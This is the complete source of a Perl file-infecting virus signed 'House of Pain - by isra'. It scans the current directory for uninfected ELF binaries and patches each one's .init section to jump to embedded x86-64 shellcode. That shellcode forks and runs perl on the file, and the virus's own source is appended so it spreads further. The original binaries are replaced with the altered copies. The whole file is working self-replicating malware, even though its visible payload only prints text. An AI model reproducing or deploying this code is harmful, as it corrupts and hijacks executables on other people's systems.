#!/usr/bin/perl
# House of Pain - by isra
use File::Copy;
use strict;

sub rd { read $_[0], my $x, $_[1];$x }
sub sk { seek $_[0], $_[1], 0 }
sub wr { syswrite $_[0], $_[1] }

my ($p1, $p2);
$p1 .= "\xe8\x44\x00\x00\x00\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72";
$p1 .= "\x6c\x00\x2d\x78\x00";

$p2 .= "\x00\x5e\x48\x31\xc0\xb8\x39\x00\x00\x00\x0f\x05\x85\xc0\x75\x2e\x48";
$p2 .= "\x8d\x3e\x48\x31\xd2\x52\x48\x8d\x5e\x11\x53\x48\x8d\x5e\x0e\x53\x57";
$p2 .= "\x48\x89\xe6\x48\x31\xc0\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x0f";
$p2 .= "\x05\x48\x21\xd2\xb8\x3c\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\x31\xd2";

# payload size: splitted payload ($p1, $p2) + 50 characters for filename
my $p_sz = length($p1) + length($p2) + 50;

# loop current directory
foreach my $f(glob qq{"./*"}){
	next if(!-f $f);
	# skip self
	next if($f eq $0);

	# file size, vx content and vx end delimiter
	my $f_sz = (stat $f)[7];
	my $vx = "\n";
	my $vx_end = "__"."END__";

	# get vx content
	my $vx_start = 0;
	open my $vh, '<', $0;
	while(<$vh>) {
		$vx_start++ if($_ =~ "#!/usr/bin/perl");
		$vx .= $_ if($vx_start);
		last if($_ =~ /$vx_end/);
	}
	my $vx_sz = length($vx);

	# read elf header
	open my $fh, '<:raw', $f;
	my @e = unpack("C a a a C12 S2 I q3 I S6", rd($fh, 64));
	# skip non-elfs
	next if($e[0] != 127 && $e[1] !~ 'E' && $e[2] !~ "L" && $e[3] !~ "F");

	# lazy check for infected files
	my $infect = 0;
	open my $fh2, '<:raw', $f;
	while(<$fh2>) {
		if($_ =~ "#!/usr/bin/perl") {
			$infect++;
			last;
		}
	}
	next if($infect);

	# 
	sk($fh, $e[21]);
	my ($y1, $z1, $y2, $z2);
	for(my $i = 0; $i < 18; $i++) {
		my @u = unpack("I2 q4 I2 q2", rd($fh, $e[26]));
		# first section with sh_flags =6 (AX) should be .init
		if($u[2] == 6) { 
			($y1, $z1) = ($u[4], $u[5]) if(!$y1);
			($y2, $z2) = ($u[4], $u[5]) if(!$y2 && $i>12 && $u[8] == 4);
		}
		last if($y2);
	}
	next if(!$y1 or !$y2); # .init or .fini not found, skip

	# read next section header entry (.rodata)
	my @u = unpack("I2 q4 I2 q2", rd($fh, $e[26]));

	# check if vx size + payload fits between .rodata and .fini
	# free space: .rodata sh_offset - (.fini sh_offset + .fini sh_size)
	next if($u[4] - ($y2 + $z2) < $p_sz + $vx_sz);

	# tmp copy for patched elf
	open my $tmp_fh, '>:raw' , "$f.t";

	# read everything until the end of .init code except for the last byte
	# which should contain the return instruction 0xc3
	sk($fh,0);
	wr($tmp_fh, rd($fh, $y1 + $z1 - 1));

	# write NOP and jmp to padding bytes after .fini
	my $dist = $y2 + $z2 - $y1 -$z1 - 7;
	my $jmp1 = "\x90\xe9".pack("V",$dist)."\xc3";
	rd($fh,7);
	wr($tmp_fh, $jmp1);

	# read and copy rest of binary until padding bytes after .fini
	wr($tmp_fh, rd($fh, $dist + 1));

	# write 1st payload
	rd($fh, $p_sz);
	wr($tmp_fh, $p1);

	# adjust payload on-the-fly to include the infected elf filename
	# filename . (50-filename) null bytes
	my @chars = split//, $f;
	for(my $i = 2; $i < length($f); $i++){ 
		wr($tmp_fh, pack("C",(hex unpack("H2", $chars[$i]))));
	}
	for(my $i = length($f) - 2; $i < 50; $i++){ 
		wr( $tmp_fh, pack("C",0x0));
	}

	# write remaining payload, jmp and vx, then copy rest of binary
	wr($tmp_fh, $p2);
	my $jmp2 = "\xe9".pack("V",-$dist-$p_sz-7);
	wr($tmp_fh, $jmp2);
	rd($fh,5);
	wr($tmp_fh, $vx);
	rd($fh, $vx_sz);
	wr($tmp_fh, rd($fh, $f_sz - ($y2 + $z2 + $p_sz + $vx_sz + 5)));

	# delete original binary and replace it with modified copy
	unlink $f;
	copy("$f.t", $f);
	unlink "$f.t";
	chmod 0755, $f;
}

# vx payload
print "jump!  " x 4;

__END__
